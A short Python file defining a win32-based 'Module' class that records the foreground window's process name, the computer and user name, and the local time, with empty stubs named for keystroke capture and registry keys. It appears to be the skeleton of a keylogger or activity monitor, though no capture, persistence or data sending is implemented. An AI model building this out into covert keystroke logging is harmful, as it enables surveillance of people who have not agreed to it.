import win32gui
import win32api
import win32process
import time


class Module(object):

    def moduleExe(self):
        NameActionProcess = win32gui.GetForegroundWindow()
        t,p = win32process.GetWindowThreadProcessId(NameActionProcess)
        HadleActionProcess = win32api.OpenProcess(0x0410, False, p)
        NameProcess = win32process.GetModuleFileNameEx(HadleActionProcess, 0)
        BufferSpisok = NameProcess.split("\\")
        return BufferSpisok[-1]

    def moduleName(self):
        PCName = win32api.GetComputerName()
        UserName = win32api.GetUserName()
        resutName = "%s_%s" % (PCName, UserName)
        return resutName

    def moduleTime(self):
        TimeLocal = time.strftime("%x %X",)
        return TimeLocal

    def moduleKeystroke(self):
        pass

    def moduleRegKey(self):
        pass

